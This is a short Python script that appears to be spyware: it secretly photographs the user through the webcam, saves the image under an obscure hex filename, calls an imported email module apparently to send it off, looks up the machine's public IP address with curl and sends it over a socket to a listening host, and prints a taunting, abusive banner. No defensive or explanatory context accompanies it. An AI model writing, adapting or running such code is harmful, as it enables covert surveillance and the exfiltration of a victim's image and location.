from threading import Thread
import cv2
from pyfiglet import Figlet
from os import popen
import socket
from email_send import EMAIL

socket_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = '127.0.0.1'
port = 9995


def take_ip_address():

    socket_client.connect((host, port))

    number_add = 0
    json_ip_data = popen('curl -s wtfismyip.com/json')

    for ip_address_json in json_ip_data:
        if number_add >= 1:
            ip = ip_address_json
            ip = str(ip)
            socket_client.sendall(bytes(ip + "\n", "utf-8"))
            socket_client.close()
            return

        number_add += 1


class OpencvFace:

    def __init__(self):

        self.video_capture = cv2.VideoCapture(0)
        self.img_name = "8e4d940cc9ecbb9f"

    def open_camera(self):

        ret, frame = self.video_capture.read()
        cv2.imshow('video', frame)
        cv2.waitKey(1)
        cv2.imwrite(filename=self.img_name + '.jpg', img=frame)
        self.close_camera()

    def close_camera(self):

        self.video_capture.release()
        cv2.destroyAllWindows()

        email_send = EMAIL()
        email_send.text_email()


def print_str():

    str_type = Figlet(font="Doom")
    print(str_type.renderText('LOOK   AT   ME  BITCH '))


def main():

    opencv_face = OpencvFace()

    thread_print_str = Thread(target=print_str())
    thread_opencv_face = Thread(target=opencv_face.open_camera())
    thread_take_ip_address = Thread(target=take_ip_address())

    thread_opencv_face.start()
    thread_print_str.start()
    thread_take_ip_address.start()
